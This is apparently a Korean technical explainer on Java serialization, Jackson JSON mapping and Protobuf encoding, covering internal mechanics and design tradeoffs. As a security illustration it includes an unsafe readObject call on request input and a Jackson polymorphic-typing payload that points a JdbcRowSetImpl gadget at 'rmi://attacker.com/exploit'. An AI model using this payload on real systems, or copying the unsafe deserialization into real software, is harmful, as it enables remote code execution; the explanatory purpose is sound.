# 직렬화/역직렬화 — 내부 동작과 설계 근거

---

## 1. Problem First

### 시나리오 A: 객체를 네트워크로 전송해야 한다

```java
public class Order {
    private Long id;
    private List<Item> items;
    private BigDecimal totalPrice;
    private LocalDateTime createdAt;
}
```

JVM 메모리 위의 이 객체는 **힙 주소 기반 포인터 구조**다.

```
힙 메모리:
Order @ 0x7f3a → id: 42
                 items → 0x8c2b (List 객체)
                              → 0x9d4e (Item 객체)
                              → 0xae5f (Item 객체)
                 totalPrice → 0xbf60 (BigDecimal 객체)
```

이 주소값을 그대로 다른 JVM(또는 다른 머신)으로 보내면? **받는 쪽의 0x7f3a에는 전혀 다른 객체가 있거나, 아무것도 없다.**

포인터는 해당 프로세스 메모리 공간에서만 유효하다. 네트워크 전송, 파일 저장, 프로세스 간 통신 모두 **주소가 아닌 값** 으로 바꿔야 한다. → 이것이 직렬화가 필요한 근본 이유다.

---

### 시나리오 B: Java 기본 직렬화를 아무 생각 없이 쓴 경우

```java
public class User implements Serializable {
    private String name;
    private String password;  // 민감 정보
    private transient String sessionToken; // transient니까 안전하다고 생각
}
```

```java
// 어느 날 User 클래스에 필드 추가
public class User implements Serializable {
    private String name;
    private String password;
    private transient String sessionToken;
    private String email; // 새로 추가
}
```

```
java.io.InvalidClassException: User;
local class incompatible:
stream classdesc serialVersionUID = -3051897552800999740,
local class serialVersionUID = 7081024620857052916
```

**클래스 구조가 바뀌면 이전에 직렬화된 데이터를 읽지 못한다.** Redis에 캐싱된 수백만 개의 세션 객체가 전부 읽기 불가가 된다. 배포 순간 전체 사용자가 로그아웃된다.

### 시나리오 C: 역직렬화 취약점

```java
// 외부에서 받은 바이트 스트림을 그대로 역직렬화
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject(); // 여기서 임의 코드 실행 가능
```

**Java 기본 직렬화는 역직렬화 과정에서 생성자를 우회하고 객체를 만든다.** 공격자가 조작한 바이트 스트림으로 가젯 체인(Gadget Chain)을 구성하면 RCE(Remote Code Execution)가 된다. 2015년 Apache Commons Collections 취약점(CVE-2015-4852)이 정확히 이 경로였다.

## 2. Mechanics

### 2-1. Java 기본 직렬화 내부 — JVM 레벨

`implements Serializable`은 인터페이스지만 메서드가 없다. **마커 인터페이스(Marker Interface)** 다 — JVM에게 "이 클래스는 직렬화를 허용한다"는 신호만 보낸다.

> 📎 **근거:** JLS §8.1.5 — _"A class may implement Serializable to indicate that instances of the class can be serialized."_

**직렬화 바이트 스트림 구조:**

```
AC ED          → Magic Number (Java 직렬화 식별자)
00 05          → 스트림 버전
73             → TC_OBJECT (객체 시작)
72             → TC_CLASSDESC (클래스 설명자)
  00 04 55 73 65 72  → 클래스명 "User" (길이 + UTF-8)
  [8바이트]    → serialVersionUID
  [플래그]     → SC_SERIALIZABLE
  [필드 목록]  → 타입 + 이름
[필드 값들]    → 실제 데이터
```

**`serialVersionUID`가 자동 생성되는 방식:**

```java
// serialVersionUID를 명시하지 않으면 JVM이 자동 계산
// 계산에 사용되는 요소:
// - 클래스 이름
// - 구현한 인터페이스 목록
// - 필드 이름 + 타입 (선언 순서 포함)
// - 메서드 시그니처

// 필드 하나만 추가해도 이 해시가 바뀐다 → InvalidClassException
```

> 📎 **근거:** Java Object Serialization Specification, §4.6 — _"Stream Unique Identifiers"_

**역직렬화가 생성자를 우회하는 방식:**

```java
public class User implements Serializable {
    private int age;

    public User() {
        if (age < 0) throw new IllegalArgumentException(); // 검증 로직
    }
}

// 역직렬화는 이 생성자를 호출하지 않는다
// sun.reflect.ReflectionFactory.newConstructorForSerialization()으로
// 검증 없이 직접 힙에 객체를 올린다
```

이것이 역직렬화 공격의 근본 원인이다. **불변식(Invariant)을 강제하는 생성자가 완전히 무시된다.**

### 2-2. JSON 직렬화 — Jackson 내부

Spring에서 `@RestController`가 객체를 JSON으로 내려주는 흐름:

```
반환 객체
    ↓
HttpMessageConverter 목록 순회
    ↓
MappingJackson2HttpMessageConverter 선택 (Accept: application/json)
    ↓
ObjectMapper.writeValue()
    ↓
BeanSerializer → 리플렉션으로 getter 또는 필드 접근
    ↓
JsonGenerator → UTF-8 바이트 스트림
```

**Jackson이 필드를 찾는 순서 (기본 설정):**

```java
// 1순위: public getter (getXxx 형태)
// 2순위: @JsonProperty 붙은 필드
// 3순위: public 필드

public class Order {
    private Long id;           // getter 없으면 직렬화 안 됨
    public String status;      // public이라 직렬화됨
    
    public Long getId() { return id; } // 이게 있어야 id가 직렬화됨
}
```

> 📎 **근거:** Jackson Databind 공식 문서 — _"Mapper will use getters (and setters) and public fields for auto-detection"_

**역직렬화 시 타입 결정 과정:**

```java
// JSON → 객체 변환 시 Jackson의 내부 흐름
String json = """
    {"id": 1, "status": "PENDING"}
    """;

Order order = objectMapper.readValue(json, Order.class);

// 내부적으로:
// 1. Order.class의 생성자 탐색 (기본 생성자 우선)
// 2. JSON 키 → 필드/setter 매핑
// 3. 타입 변환 (String "1" → Long 1)
// 4. 기본 생성자로 객체 생성 후 값 주입
```

**기본 생성자가 없으면 어떻게 되나:**

```java
public class Point {
    private final int x;
    private final int y;
    
    // 기본 생성자 없음
    public Point(int x, int y) { ... }
}

// objectMapper.readValue(json, Point.class)
// → InvalidDefinitionException: No suitable constructor found
// 해결: @JsonCreator + @JsonProperty로 생성자 지정
@JsonCreator
public Point(@JsonProperty("x") int x, @JsonProperty("y") int y) { ... }
```

### 2-3. 역직렬화 시 다형성 문제 — Spring 실무에서 자주 만나는 지점

```java
// 이런 구조를 JSON으로 주고받으려 할 때
public class NotificationEvent {
    private String type;
    private EventPayload payload; // 인터페이스
}

// payload가 EmailPayload인지 SmsPayload인지
// JSON만 봐서는 Jackson이 알 수 없다
```

```java
// 해결: @JsonTypeInfo + @JsonSubTypes
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, property = "type")
@JsonSubTypes({
    @JsonSubTypes.Type(value = EmailPayload.class, name = "EMAIL"),
    @JsonSubTypes.Type(value = SmsPayload.class,  name = "SMS")
})
public interface EventPayload { }
```

**이게 보안 문제가 되는 경우:**

```java
// DANGEROUS: 외부 입력에서 타입을 결정하게 허용
objectMapper.enableDefaultTyping(); // Deprecated & CVE 다수 발생

// 공격자가 보내는 JSON:
{
  "@class": "com.sun.rowset.JdbcRowSetImpl",  // 가젯 클래스
  "dataSourceName": "rmi://attacker.com/exploit",
  "autoCommit": true
}
```

> 📎 **근거:** CVE-2017-7525 — Jackson-databind Remote Code Execution, Jackson 공식 블로그 _"On Jackson CVEs"_ (cowtowncoder.medium.com)

### 2-4. Protocol Buffers — 바이너리 직렬화 비교

JSON의 한계가 명확한 시나리오:

```
JSON:   {"userId":12345,"amount":99.99,"currency":"USD"}
바이트: 45바이트

Protobuf 동일 데이터:
바이트: ~12바이트 (약 73% 감소)
파싱 속도: JSON 대비 3~10배 빠름
```

**Protobuf가 공간을 줄이는 핵심 — 필드 이름을 전송하지 않는다:**

```protobuf
// .proto 파일 (스키마를 양쪽이 미리 공유)
message Payment {
    int64 user_id = 1;    // 필드 번호 1
    double amount  = 2;    // 필드 번호 2
    string currency = 3;  // 필드 번호 3
}
```

```
실제 전송 바이트:
08          → 필드 1, 타입: varint
B9 60       → 12345 (varint 인코딩)
11          → 필드 2, 타입: 64-bit
...
1A 03 55 53 44  → 필드 3, "USD"
```

**필드 이름 대신 번호만 전송한다. 스키마가 없으면 해석 불가.** → 이것이 Protobuf의 장점이자 단점이다 (사람이 읽을 수 없음, 스키마 관리 필요).

> 📎 **근거:** Protocol Buffers 공식 문서 — _"Encoding"_ 섹션, Google Developers

## 4. 이 설계를 이렇게 한 이유

### Java 기본 직렬화가 생성자를 우회하는 이유 — 그리고 그 대가

**설계 의도:** 객체의 현재 상태(State)를 완전히 복원하려면, 생성자의 초기화 로직을 다시 실행하는 게 아니라 **메모리 스냅샷을 그대로 복구**해야 한다.

**대가:** 생성자에 있는 모든 불변식 검증이 무력화된다. _Effective Java_ Item 88에서 Bloch는 이를 명확히 경고한다:

> "Deserialization of untrusted data is inherently dangerous and should be avoided." (신뢰할 수 없는 데이터의 역직렬화는 본질적으로 위험하며 피해야 한다.)

> 📎 **근거:** _Effective Java_ 3판, Item 85, 88 — Joshua Bloch

### JSON이 바이너리보다 느린 이유

JSON은 사람이 읽을 수 있는 텍스트 포맷이다. 이 선택의 대가:

- `"userId"` 같은 키 이름을 매번 전송해야 한다 → 중복 데이터
- 숫자도 문자열로 전송 후 파싱 필요 → 변환 비용
- UTF-8 인코딩/디코딩 필요

**어떤 상황에서 JSON을 포기하고 Protobuf를 써야 하는가:**

- 서비스 간 호출이 초당 수만 건 이상 (내부 gRPC 통신)
- 모바일 클라이언트 — 배터리/네트워크 비용이 중요한 경우
- 반대로, 외부 API / 디버깅이 잦은 경우는 JSON이 낫다 — 바이너리는 눈으로 볼 수 없다

## 5. 이어지는 개념

|순서|개념|이유|
|---|---|---|
|1|**Java Record & 불변 객체**|직렬화 안전성의 핵심은 불변 객체다 — `readResolve()`, `readObject()` 커스터마이징으로 이어지는 선행 개념|
|2|**Redis 캐시 직렬화 전략**|Spring의 `RedisTemplate` 기본 설정이 Java 직렬화를 쓴다 — 실무에서 바로 만나는 문제, 위에서 다룬 `InvalidClassException`이 여기서 터진다|
|3|**gRPC + Protobuf**|MSA에서 서비스 간 통신 직렬화 선택의 실무 문제 — JSON vs Protobuf 트레이드오프를 실제 코드 레벨에서 다룬다|
|4|**Jackson ObjectMapper 설정 심화**|`DeserializationFeature`, `SerializationFeature`, `Module` 등록 — Spring에서 ObjectMapper를 잘못 설정해서 생기는 버그의 대부분이 여기서 나온다|
